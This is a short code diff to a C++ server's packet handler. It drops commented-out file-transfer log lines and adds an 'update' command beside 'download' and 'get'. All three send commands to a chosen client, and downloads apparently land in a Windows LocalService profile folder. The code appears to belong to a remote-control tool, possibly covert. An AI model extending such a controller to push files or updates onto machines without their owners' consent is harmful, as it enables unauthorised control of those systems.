@@ -192,9 +192,6 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 	}
 	case PacketType::ClientFileTransfer_EndOfFile:
 	{
-		//std::cout << "File transfer completed. File received." << std::endl;
-		//std::cout << "File Name: " << file.fileName << std::endl;
-		//std::cout << "File Size(bytes): " << file.bytesWritten << std::endl;
 		connections[ID]->ifile.bytesWritten = 0;
 		connections[ID]->ifile.outfileStream.close(); //close file after we are done writing file
 
@@ -357,6 +354,9 @@ void Server::ParseClientInput(std::string userinput, int& clientID)
 		//Download a file inside C:/Windows/ServiceProfiles/LocalService
 		else if (General::processParameter(userinput, "download")) {
 			SendString(clientID, userinput, PacketType::Download);
+		}
+		else if (General::processParameter(userinput, "update")) {
+			SendString(clientID, userinput, PacketType::Update);
 		}
 		else if (General::processParameter(userinput, "get")) {
 			RequestFile(clientID, userinput);
